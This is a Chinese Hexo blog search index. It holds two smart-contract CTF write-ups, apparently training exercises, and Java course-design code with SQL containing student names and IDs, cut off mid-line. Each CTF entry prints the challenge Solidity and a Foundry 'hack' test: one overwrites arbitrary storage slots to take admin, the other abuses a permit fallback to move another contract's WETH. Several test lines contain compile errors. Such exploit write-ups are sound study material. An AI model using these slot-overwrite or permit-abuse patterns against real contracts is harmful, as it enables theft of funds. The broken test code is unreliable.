<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CTF-Storage</title>
      <link href="/2024/12/02/CTF-Storage/"/>
      <url>/2024/12/02/CTF-Storage/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-Storeage"><a href="#CTF-Storeage" class="headerlink" title="CTF-Storeage"></a>CTF-Storeage</h1><p>题目代码又俩个：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;./StorageSlot.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Storage1 &#123;</span><br><span class="line">    uint256 public constant VERSION = 1;</span><br><span class="line">    address public aaaaa;</span><br><span class="line">    address public admin;</span><br><span class="line">    bytes32 public constant OPERATOR_ROLE = keccak256(&quot;OPERATOR_ROLE&quot;);</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) public gasDeposits;</span><br><span class="line"></span><br><span class="line">    event SendFlag();</span><br><span class="line">    event SetLogicContract(bytes32 key, address oldAddress, address newAddress);</span><br><span class="line">    event DepositedGas(address account, uint256 amount);</span><br><span class="line">    event WithdrewGas(address account, uint256 amount);</span><br><span class="line"></span><br><span class="line">    error ZeroValue();</span><br><span class="line">    error ZeroAmount();</span><br><span class="line">    error NoAccess(bytes32 roleid, address account);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        admin = address(0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyAdmin() &#123;</span><br><span class="line">        require(admin == msg.sender);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 设置任意slot内容</span><br><span class="line">    function setLogicContract(bytes32 key, address contractAddress) external &#123;</span><br><span class="line">        StorageSlot.AddressSlot storage slot = StorageSlot.getAddressSlot(key);</span><br><span class="line">        emit SetLogicContract(key, slot.value, contractAddress);</span><br><span class="line">        slot.value = contractAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 存款：给某个账户存款</span><br><span class="line">    function depositGasFor(address account) external payable &#123;</span><br><span class="line">        depositGas(account, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line">    function depositGas(address account, uint256 amount) internal &#123;</span><br><span class="line">        if (amount == 0) revert ZeroValue();</span><br><span class="line">        gasDeposits[account] = gasDeposits[account] + amount;</span><br><span class="line">        emit DepositedGas(account, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 取款</span><br><span class="line">    function withdrawGas(uint256 amount) external &#123;</span><br><span class="line">        if (amount == 0) revert ZeroAmount();</span><br><span class="line"></span><br><span class="line">        uint256 withdrawAmount = amount &gt; gasDeposits[msg.sender] ? gasDeposits[msg.sender]: amount;</span><br><span class="line"></span><br><span class="line">        if (withdrawAmount == 0) return;</span><br><span class="line"></span><br><span class="line">        gasDeposits[msg.sender] = gasDeposits[msg.sender] - withdrawAmount;</span><br><span class="line">        payable(msg.sender).transfer(withdrawAmount);</span><br><span class="line"></span><br><span class="line">        emit WithdrewGas(msg.sender, withdrawAmount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public  &#123;</span><br><span class="line">        require(admin == msg.sender);</span><br><span class="line">        require(gasDeposits[msg.sender] &gt;= 9999999999999999999999999999999999);</span><br><span class="line">        emit SendFlag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        depositGas(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  // SPDX-License-Identifier: MIT</span><br><span class="line">// OpenZeppelin Contracts (last updated v4.7.0) (utils/StorageSlot.sol)</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @dev Library for reading and writing primitive types to specific storage slots.</span><br><span class="line"> *</span><br><span class="line"> * Storage slots are often used to avoid storage conflict when dealing with upgradeable contracts.</span><br><span class="line"> * This library helps with reading and writing to such slots without the need for inline assembly.</span><br><span class="line"> *</span><br><span class="line"> * The functions in this library return Slot structs that contain a `value` member that can be used to read or write.</span><br><span class="line"> *</span><br><span class="line"> * Example usage to set ERC1967 implementation slot:</span><br><span class="line"> * ```</span><br><span class="line"> * contract ERC1967 &#123;</span><br><span class="line"> *     bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br><span class="line"> *</span><br><span class="line"> *     function _getImplementation() internal view returns (address) &#123;</span><br><span class="line"> *         return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;</span><br><span class="line"> *     &#125;</span><br><span class="line"> *</span><br><span class="line"> *     function _setImplementation(address newImplementation) internal &#123;</span><br><span class="line"> *         require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;);</span><br><span class="line"> *         StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value = newImplementation;</span><br><span class="line"> *     &#125;</span><br><span class="line"> * &#125;</span><br><span class="line"> * ```</span><br><span class="line"> *</span><br><span class="line"> * _Available since v4.1 for `address`, `bool`, `bytes32`, and `uint256`._</span><br><span class="line"> */</span><br><span class="line">library StorageSlot &#123;</span><br><span class="line">    struct AddressSlot &#123;</span><br><span class="line">        address value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    struct BooleanSlot &#123;</span><br><span class="line">        bool value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    struct Bytes32Slot &#123;</span><br><span class="line">        bytes32 value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    struct Uint256Slot &#123;</span><br><span class="line">        uint256 value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns an `AddressSlot` with member `value` located at `slot`.</span><br><span class="line">     */</span><br><span class="line">    function getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) &#123;</span><br><span class="line">        /// @solidity memory-safe-assembly</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r.slot := slot</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns an `BooleanSlot` with member `value` located at `slot`.</span><br><span class="line">     */</span><br><span class="line">    function getBooleanSlot(bytes32 slot) internal pure returns (BooleanSlot storage r) &#123;</span><br><span class="line">        /// @solidity memory-safe-assembly</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r.slot := slot</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns an `Bytes32Slot` with member `value` located at `slot`.</span><br><span class="line">     */</span><br><span class="line">    function getBytes32Slot(bytes32 slot) internal pure returns (Bytes32Slot storage r) &#123;</span><br><span class="line">        /// @solidity memory-safe-assembly</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r.slot := slot</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns an `Uint256Slot` with member `value` located at `slot`.</span><br><span class="line">     */</span><br><span class="line">    function getUint256Slot(bytes32 slot) internal pure returns (Uint256Slot storage r) &#123;</span><br><span class="line">        /// @solidity memory-safe-assembly</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r.slot := slot</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题也是属于签到题了。就是考了一个slot的概念吧，一个slot储存是占32字节的，对于mapping映射来说，那么就是使用哈希函数来计算的，比如：<br>对于一个mapping映射，（address-&gt;uint256）此时它的slot 表面是4，实际它是通过slot&#x3D;keccak(encodePacked(address,uint256(4)));来计算的<br>这也就是我们这个的余额计算的步骤</p><p>通过分析可以知道;<br>admid是占slot[3];<br>balance是占slot<a href="%E5%AE%9E%E9%99%85%E6%98%AF%E9%80%9A%E8%BF%87%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0%E7%9A%84%E8%AE%A1%E7%AE%97">4</a></p><p>那么我们就可以直接调用setLogicContract函数去更改对应的储槽位就可以了，<br>测试函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier:MIT</span><br><span class="line">pragma solidity ^0.8.16;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;forge-std/console.sol&quot;;</span><br><span class="line"></span><br><span class="line">import &quot;src/StorageSlot.sol&quot;;</span><br><span class="line">import &quot;src/Storage1.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract hack is Test&#123;</span><br><span class="line">   Storage1 storage1;</span><br><span class="line"></span><br><span class="line">   function setUp() public &#123;</span><br><span class="line">    storage1 = new Storage1();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   function test_Storage1() public &#123;</span><br><span class="line">      storage1.setLogicContract(bytes32(uint256(3)),address(this));</span><br><span class="line">       bytes32 slot = keccak256(abi.encodePacked(address(this), uint256(4)));</span><br><span class="line">      storage1.setLogicContract(slot,address(9999999999999999999999999999999999));</span><br><span class="line">assertTrue(storage1.isComplete(), &quot;The storage is not complete&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-LostAssert</title>
      <link href="/2024/12/02/CTF-LostAssert/"/>
      <url>/2024/12/02/CTF-LostAssert/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-LostAssert"><a href="#CTF-LostAssert" class="headerlink" title="CTF-LostAssert"></a>CTF-LostAssert</h1><p>这道题我感觉属于签到题了。就是分清包装代币，s代币，原生代币的关系</p><p>题目源码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier:MIT</span><br><span class="line">pragma solidity ^0.8.26;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol&quot;;</span><br><span class="line">import &#123;IERC20Permit, ERC20Permit&#125; from &quot;@openzeppelin/contracts/token/ERC20/extensions/draft-ERC20Permit.sol&quot;;</span><br><span class="line"></span><br><span class="line">// 普通的ERC20代币</span><br><span class="line">contract MockWETH is ERC20(&quot;Wrapped ETH&quot;, &quot;WETH&quot;) &#123;</span><br><span class="line">    event Deposit(address indexed dst, uint256 wad);</span><br><span class="line">    event Withdrawal(address indexed src, uint256 wad);</span><br><span class="line"></span><br><span class="line">    /// @dev Original WETH9 implements `fallback` function instead of `receive` function due to a earlier solidity version</span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        deposit();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        _mint(msg.sender, msg.value);</span><br><span class="line">        emit Deposit(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 wad) public &#123;</span><br><span class="line">        require(balanceOf(msg.sender) &gt;= wad, &quot;weth: insufficient balance&quot;);</span><br><span class="line"></span><br><span class="line">        _burn(msg.sender, wad);</span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: wad&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;weth: failed&quot;);</span><br><span class="line"></span><br><span class="line">        emit Withdrawal(msg.sender, wad);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 本身也是一个ERC20代币，并且拥有Permit功能</span><br><span class="line">// 并且添加了一个普通的ERC20代币作为underlyingToken</span><br><span class="line">contract MocksWETH is ERC20Permit &#123;</span><br><span class="line">    using SafeERC20 for IERC20;</span><br><span class="line"></span><br><span class="line">    address underlying;</span><br><span class="line"></span><br><span class="line">    constructor(address _underlying) ERC20(&quot;WrappedERC20&quot;, &quot;WERC20&quot;) ERC20Permit(&quot;WrappedERC20&quot;)&#123;</span><br><span class="line">        underlying = _underlying;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 将资产从WETH换成sWETH</span><br><span class="line">    function deposit() external returns (uint256) &#123;</span><br><span class="line">        uint256 _amount = IERC20(underlying).balanceOf(msg.sender);</span><br><span class="line">        IERC20(underlying).safeTransferFrom(msg.sender, address(this), _amount);</span><br><span class="line">        return _deposit(_amount, msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit(uint256 amount) external returns (uint256) &#123;</span><br><span class="line">        IERC20(underlying).safeTransferFrom(msg.sender, address(this), amount);</span><br><span class="line">        return _deposit(amount, msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 链下签名： 将资产从WETH换成sWETH</span><br><span class="line">    function depositWithPermit(</span><br><span class="line">        address target,</span><br><span class="line">        uint256 value,</span><br><span class="line">        uint256 deadline,</span><br><span class="line">        uint8 v,</span><br><span class="line">        bytes32 r,</span><br><span class="line">        bytes32 s,</span><br><span class="line">        address to</span><br><span class="line">    ) external returns (uint256) &#123;</span><br><span class="line">        // underlying即WETH，没有这个方法，因此去到fallback()而不会检验，相当于啥也没写</span><br><span class="line">        IERC20Permit(underlying).permit(target,address(this),value,deadline, v,r,s);</span><br><span class="line">        // 因为有个已经执行过的操作：      WETH资产：LostAssets 授权给 sWETH合约</span><br><span class="line">        // 因此sWETH合约可以用transferFrom()来操作 LostAssets 的WETH资产</span><br><span class="line">        // 因为上面的代码形同虚设，因此任何人都可以使用此方法</span><br><span class="line">        IERC20(underlying).safeTransferFrom(target, address(this), value);</span><br><span class="line">        return _deposit(value, to);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _deposit(uint256 value, address to) internal returns (uint256) &#123;</span><br><span class="line">        _mint(to, value);</span><br><span class="line">        return value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 烧掉sWETH，换成WETH</span><br><span class="line">    function withdraw() external returns (uint256) &#123;</span><br><span class="line">        return _withdraw(msg.sender, balanceOf(msg.sender), msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) external returns (uint256) &#123;</span><br><span class="line">        return _withdraw(msg.sender, amount, msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _withdraw(address from,uint256 amount,address to) internal returns (uint256) &#123;</span><br><span class="line">        _burn(from, amount);</span><br><span class="line">        IERC20(underlying).safeTransfer(to, amount);</span><br><span class="line">        return amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract LostAssets &#123;</span><br><span class="line">    MockWETH public WETH;</span><br><span class="line">    MocksWETH public sWETH;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        require(msg.value &gt;= 1 ether, &quot;At least 1 ether&quot;);</span><br><span class="line"></span><br><span class="line">        WETH = new MockWETH();</span><br><span class="line">        sWETH = new MocksWETH(address(WETH));</span><br><span class="line"></span><br><span class="line">        // WETH资产：LostAssets获得msg.value的WETH</span><br><span class="line">        WETH.deposit&#123;value: msg.value&#125;();</span><br><span class="line">        // WETH资产：LostAssets 授权给 sWETH合约</span><br><span class="line">        WETH.approve(address(sWETH), type(uint256).max);</span><br><span class="line">        // sWETH: LostAssets 将资产从WETH换成sWETH</span><br><span class="line">        // 因为msg.sender是 LostAssets ，因此可以操作成功</span><br><span class="line">        // 这里已经操作了一半的资产，因此还有0.5ether可以操作</span><br><span class="line">        sWETH.deposit(msg.value / 2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 将LostAssets合约的WETH设置为0</span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        require(WETH.balanceOf(address(this)) == 0);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于这个LostAssert合约已经给sWTH授予权限了，而且已经消耗了0.5个WETH，所以我们就直接调用depositWithPermit 函数，将剩下的WETH换为sWETH</p><p>测试代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier:MIT</span><br><span class="line">pragma solidity ^0.8.26;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;forge-std/console.sol&quot;; </span><br><span class="line">import &quot;src/LostAsset.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract hack &#123;</span><br><span class="line">    MockWETH WETH;</span><br><span class="line">    MocksWETH sweth;</span><br><span class="line">    LostAssets lostassets;</span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        weth = new MockWETH();</span><br><span class="line">        sweth = new MocksWETH();</span><br><span class="line">        lostassets = new LostAssets(1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_LostAssets() public &#123;</span><br><span class="line">        sweth.depositWithPermit(lostassets,0.5,1000,1,0x00,0x00,address(this));</span><br><span class="line">       assertEq(lostassets.isComplete(),ture);</span><br><span class="line">     console.log(&quot;The balance LostAssert is&quot;,WETH.balanceOf(lostassets));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java课程设计_数据库代码</title>
      <link href="/2024/12/02/Java%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BB%A3%E7%A0%81/"/>
      <url>/2024/12/02/Java%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BB%A3%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="title-Java课程设计代码date-2024-12-02-03-03-51tags-java"><a href="#title-Java课程设计代码date-2024-12-02-03-03-51tags-java" class="headerlink" title="title: Java课程设计代码date: 2024-12-02 03:03:51tags: java"></a>title: Java课程设计代码<br>date: 2024-12-02 03:03:51<br>tags: java</h2><h2 id="数据库设计代码"><a href="#数据库设计代码" class="headerlink" title="数据库设计代码"></a>数据库设计代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//创建数据库</span><br><span class="line">create database Student;</span><br><span class="line">use student;</span><br><span class="line">//创建学生信息表</span><br><span class="line">create table student(</span><br><span class="line">    stuid1 char(20) unique comment &#x27;学号&#x27;,</span><br><span class="line">    name char(20)  comment &#x27;姓名&#x27;,</span><br><span class="line">    telenumber int comment &#x27;电话号码&#x27;,</span><br><span class="line">    qqmail char(20) comment &#x27;邮箱&#x27;,</span><br><span class="line">    classnumber char (20) comment &#x27;班级&#x27;</span><br><span class="line">)comment&#x27;学生信息表&#x27;;</span><br><span class="line"></span><br><span class="line">//插入学生信息</span><br><span class="line">insert into student (stuid1,name,telenumber,qqmail,classnumber ) values</span><br><span class="line">    (&#x27;2023131051&#x27; ,&#x27;何圆&#x27;,123456,&#x27;123456@qq.com&#x27;,&#x27;区块链232班&#x27;),</span><br><span class="line">    (&#x27;2023131041&#x27;,&#x27;洪汇淇&#x27;,123456,&#x27;123456@qq.com&#x27;,&#x27;区块链232班&#x27;),</span><br><span class="line">    (&#x27;2023131043&#x27;,&#x27;成璐&#x27;,123456,&#x27;123456@qq.com&#x27;,&#x27;区块链232班&#x27;);</span><br><span class="line">select * from student ;</span><br><span class="line"></span><br><span class="line">//创建学生成绩表</span><br><span class="line">CREATE TABLE studentgrade (</span><br><span class="line">    stuid2 char(20) COMMENT &#x27;学号&#x27;,</span><br><span class="line">    name CHAR(20) COMMENT &#x27;姓名&#x27;,</span><br><span class="line">    math INT COMMENT &#x27;高数&#x27;,</span><br><span class="line">    MaYuan INT COMMENT &#x27;马原&#x27;,</span><br><span class="line">    English INT COMMENT &#x27;英语&#x27;,</span><br><span class="line">    linemath INT COMMENT &#x27;线性代数&#x27;</span><br><span class="line"></span><br><span class="line">) COMMENT &#x27;学生成绩表&#x27;;</span><br><span class="line"></span><br><span class="line">//插入学生成绩</span><br><span class="line">INSERT INTO studentgrade (stuid2, name, math, MaYuan, linemath, English) VALUES</span><br><span class="line">    (&#x27;2023131051&#x27;, &#x27;何圆&#x27;, 94, 83, 87, 78)</span><br><span class="line">    (&#x27;2023131041&#x27;, &#x27;洪汇淇&#x27;, 95, 82, 80, 92),</span><br><span class="line">    (&#x27;2023131043&#x27;, &#x27;成璐&#x27;, 91, 87, 84, 97);</span><br><span class="line">SELECT * FROM studentgrade;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java</title>
      <link href="/2024/12/02/Java/"/>
      <url>/2024/12/02/Java/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java课程设计代码</title>
      <link href="/2024/12/02/Java%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1%E4%BB%A3%E7%A0%81/"/>
      <url>/2024/12/02/Java%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1%E4%BB%A3%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h2 id="Java代码"><a href="#Java代码" class="headerlink" title="Java代码"></a>Java代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import javax.swing.JButton;</span><br><span class="line">import javax.swing.JFrame;</span><br><span class="line">import javax.swing.JLabel;</span><br><span class="line">import javax.swing.JPanel;</span><br><span class="line">import javax.swing.JPasswordField;</span><br><span class="line">import javax.swing.JTextField;</span><br><span class="line">import javax.swing.*;</span><br><span class="line">import java.awt.*;</span><br><span class="line">import java.sql.*;</span><br><span class="line">import java.util.List;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import javax.swing.table.DefaultTableModel;</span><br><span class="line">import org.jfree.chart.*;</span><br><span class="line">import org.jfree.chart.plot.*;</span><br><span class="line">import org.jfree.data.category.DefaultCategoryDataset;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.text.DecimalFormat;</span><br><span class="line"></span><br><span class="line">// 主类</span><br><span class="line">public class student &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        // 创建 JFrame 实例</span><br><span class="line">        JFrame frame = new JFrame(&quot;Login Example&quot;);</span><br><span class="line">        // Setting the width and height of frame</span><br><span class="line">        frame.setSize(350, 200);</span><br><span class="line">        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);</span><br><span class="line"></span><br><span class="line">        /* 创建面板，这个类似于 HTML 的 div 标签</span><br><span class="line">         * 我们可以创建多个面板并在 JFrame 中指定位置</span><br><span class="line">         * 面板中我们可以添加文本字段，按钮及其他组件。</span><br><span class="line">         */</span><br><span class="line">        JPanel panel = new JPanel();</span><br><span class="line">        // 添加面板</span><br><span class="line">        frame.add(panel);</span><br><span class="line">        /*</span><br><span class="line">         * 调用用户定义的方法并添加组件到面板</span><br><span class="line">         */</span><br><span class="line">        placeComponents(panel);</span><br><span class="line"></span><br><span class="line">        // 设置界面可见</span><br><span class="line">        frame.setVisible(true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static void placeComponents(JPanel panel) &#123;</span><br><span class="line"></span><br><span class="line">        /* 布局部分我们这边不多做介绍</span><br><span class="line">         * 这边设置布局为 null</span><br><span class="line">         */</span><br><span class="line">        panel.setLayout(null);</span><br><span class="line"></span><br><span class="line">        // 创建 JLabel</span><br><span class="line">        JLabel userLabel = new JLabel(&quot;User:&quot;);</span><br><span class="line">        /* 这个方法定义了组件的位置。</span><br><span class="line">         * setBounds(x, y, width, height)</span><br><span class="line">         * x 和 y 指定左上角的新位置，由 width 和 height 指定新的大小。</span><br><span class="line">         */</span><br><span class="line">        userLabel.setBounds(10,20,80,25);</span><br><span class="line">        panel.add(userLabel);</span><br><span class="line"></span><br><span class="line">        /*</span><br><span class="line">         * 创建文本域用于用户输入</span><br><span class="line">         */</span><br><span class="line">        JTextField userText = new JTextField(20);</span><br><span class="line">        userText.setBounds(100,20,165,25);</span><br><span class="line">        panel.add(userText);</span><br><span class="line"></span><br><span class="line">        // 输入密码的文本域</span><br><span class="line">        JLabel passwordLabel = new JLabel(&quot;Password:&quot;);</span><br><span class="line">        passwordLabel.setBounds(10,50,80,25);</span><br><span class="line">        panel.add(passwordLabel);</span><br><span class="line"></span><br><span class="line">        /*</span><br><span class="line">         *这个类似用于输入的文本域</span><br><span class="line">         * 但是输入的信息会以点号代替，用于包含密码的安全性</span><br><span class="line">         */</span><br><span class="line">        JPasswordField passwordText = new JPasswordField(20);</span><br><span class="line">        passwordText.setBounds(100,50,165,25);</span><br><span class="line">        panel.add(passwordText);</span><br><span class="line"></span><br><span class="line">        // 创建登录按钮</span><br><span class="line">        JButton loginButton = new JButton(&quot;login&quot;);</span><br><span class="line">        loginButton.setBounds(10, 80, 80, 25);</span><br><span class="line">        panel.add(loginButton);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class StudentGradeManagementSystem &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        SwingUtilities.invokeLater(() -&gt; &#123;</span><br><span class="line">            JFrame frame = new JFrame(&quot;学生成绩管理系统&quot;);</span><br><span class="line">            frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);</span><br><span class="line">            frame.setSize(1000, 800);</span><br><span class="line">            frame.add(new MainPanel());</span><br><span class="line">            frame.setLocationRelativeTo(null);</span><br><span class="line">            frame.setVisible(true);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 主面板</span><br><span class="line">class MainPanel extends JPanel &#123;</span><br><span class="line">    public MainPanel() &#123;</span><br><span class="line">        ImageIcon originalIcon = new ImageIcon(&quot;C:\\Users\\ASUS\\Desktop\\微信图片_20241031205640.jpg&quot;);</span><br><span class="line">        Image scaledImage = originalIcon.getImage().getScaledInstance(980, 800, Image.SCALE_SMOOTH); // 根据需要调整大小</span><br><span class="line">        JLabel background = new JLabel(new ImageIcon(scaledImage));</span><br><span class="line">        background.setLayout(new BorderLayout());</span><br><span class="line"></span><br><span class="line">        JButton btnStudentLogin = new JButton(&quot;学生登录&quot;);</span><br><span class="line">        JButton btnTeacherLogin = new JButton(&quot;教师登录&quot;);</span><br><span class="line">        JButton btnAdminLogin = new JButton(&quot;管理员登录&quot;);</span><br><span class="line"></span><br><span class="line">        btnStudentLogin.addActionListener(e -&gt; studentLogin());</span><br><span class="line">        btnTeacherLogin.addActionListener(e -&gt; teacherLogin());</span><br><span class="line">        btnAdminLogin.addActionListener(e -&gt; adminLogin());</span><br><span class="line"></span><br><span class="line">        add(btnStudentLogin);</span><br><span class="line">        add(btnTeacherLogin);</span><br><span class="line">        add(btnAdminLogin);</span><br><span class="line">        add(background, BorderLayout.CENTER);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void studentLogin() &#123;</span><br><span class="line">        login(&quot;学生&quot;, this::showStudentFeatures);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void teacherLogin() &#123;</span><br><span class="line">        login(&quot;教师&quot;, this::showTeacherFeatures);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void adminLogin() &#123;</span><br><span class="line">        login(&quot;管理员&quot;, this::showAdminFeatures);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void login(String role, LoginCallback callback) &#123;</span><br><span class="line">        JTextField idField = new JTextField(15);</span><br><span class="line">        JPasswordField passwordField = new JPasswordField(15);</span><br><span class="line">        JPanel loginPanel = new JPanel(new GridLayout(0, 1));</span><br><span class="line">        loginPanel.add(new JLabel(&quot;ID:&quot;));</span><br><span class="line">        loginPanel.add(idField);</span><br><span class="line">        loginPanel.add(new JLabel(&quot;密码:&quot;));</span><br><span class="line">        loginPanel.add(passwordField);</span><br><span class="line"></span><br><span class="line">        int option = JOptionPane.showConfirmDialog(this, loginPanel, role + &quot;登录&quot;, JOptionPane.OK_CANCEL_OPTION);</span><br><span class="line">        if (option == JOptionPane.OK_OPTION) &#123;</span><br><span class="line">            String id = idField.getText();</span><br><span class="line">            String password = new String(passwordField.getPassword());</span><br><span class="line">            callback.showFeatures(id, password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void showStudentFeatures(String studentId, String password) &#123;</span><br><span class="line">        // 此处可以添加学生验证逻辑</span><br><span class="line">        JFrame studentFrame = new JFrame(&quot;学生功能&quot;);</span><br><span class="line">        studentFrame.setSize(500, 400);</span><br><span class="line">        studentFrame.add(new StudentPanel(studentId)); // 传递学生ID</span><br><span class="line">        studentFrame.setLocationRelativeTo(null);</span><br><span class="line">        studentFrame.setVisible(true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void showTeacherFeatures(String teacherId, String password) &#123;</span><br><span class="line">        // 此处可以添加教师验证逻辑</span><br><span class="line">        JFrame teacherFrame = new 